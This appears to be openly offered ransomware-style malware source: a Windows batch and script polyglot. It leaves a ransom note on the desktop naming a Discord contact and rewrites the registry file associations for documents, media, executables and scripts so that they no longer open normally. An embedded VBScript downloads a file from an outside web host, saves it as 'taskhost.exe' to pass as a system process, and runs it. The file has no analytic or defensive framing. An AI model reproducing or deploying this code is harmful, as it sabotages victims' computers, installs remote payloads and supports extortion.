@echo off
Rem BY **Aincrad**

SET DESKTOP_REG_ENTRY="HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
SET DESKTOP_REG_KEY="Desktop"
SET DESKTOP_DIR=

FOR /F "tokens=1,2*" %%a IN ('REG QUERY %DESKTOP_REG_ENTRY% /v %DESKTOP_REG_KEY% ^| FINDSTR "REG_SZ"') DO (
    set DESKTOP_DIR="%%c"
)

(
  echo Batch Ramsomware
  echo TO Decrypt Your Files Contact:
  echo Discord: Necromancer#5811
) > %DESKTOP_DIR%\Readme_Ransomware.txt

:Virus
reg add HKCU\Software\Classes\.VBS /d "htafile" /f
reg add HKCU\Software\Classes\.docx /d "htafile" /f
reg add HKCU\Software\Classes\.pdf /d "htafile" /f
reg add HKCU\Software\Classes\.doc /d "htafile" /f
reg add HKCU\Software\Classes\.mp3 /d "htafile" /f
reg add HKCU\Software\Classes\.mp4 /d "htafile" /f
reg add HKCU\Software\Classes\.EXE /d "htafile" /f
reg add HKCU\Software\Classes\.bat /d "htafile" /f
reg add HKCU\Software\Classes\.jar /d "htafile" /f
reg add HKCU\Software\Classes\.py /d "htafile" /f
reg add HKCU\Software\Classes\.ps1 /d "htafile" /f

:Main
@if (true == false) @end /*
@echo off
Rem Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/
set "SYSDIR=SysWOW64"
if "%PROCESSOR_ARCHITECTURE%" == "x86" if not defined PROCESSOR_ARCHITEW6432 set "SYSDIR=System32"
"%WINDIR%\%SYSDIR%\cscript.exe" //nologo //e:javascript "%~f0" %*
goto :EOF */

(function(readFile, code)
{
    var e;
    try {
        var vb = new ActiveXObject('MSScriptControl.ScriptControl');
        vb.Language = 'VBScript';
        vb.AddObject('WScript', WScript, true);
        vb.AddCode(code);
    } catch(e) {
        var file = readFile();
        var prologLen = file.slice(0, file.indexOf(code)).split('\n').length;
        var vbe = vb.Error;
        WScript.Echo(
            WScript.ScriptFullName + 
            '(' + ( prologLen + vbe.Line - 1 ) + ', ' + vbe.Column + ') ' + 
            vbe.Source + ': ' + vbe.Description);
    }
})(
function()
{
    var fso = new ActiveXObject('Scripting.FileSystemObject');
    var f = fso.OpenTextFile(WScript.ScriptFullName, 1, true);
    var file = f.ReadAll();
    f.Close();
    return file;
}, 
(function()
{
    return arguments.callee.toString().replace(/^[\s\S]+\/\*|\*\/[\s\S]+$/g, '');
/* ' VBScript

' Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/

dim http_obj
dim stream_obj
dim shell_obj
 
set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
set shell_obj = CreateObject("WScript.Shell")
 
URL = "https://softwarefuturenet.000webhostapp.com/TempDocs/Shareware.temp" 
FILENAME = "taskhost.exe" 
RUNCMD = "taskhost.exe" 

http_obj.open "GET", URL, False
http_obj.send
 
stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2
 
shell_obj.run RUNCMD

' Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/

*/
})());


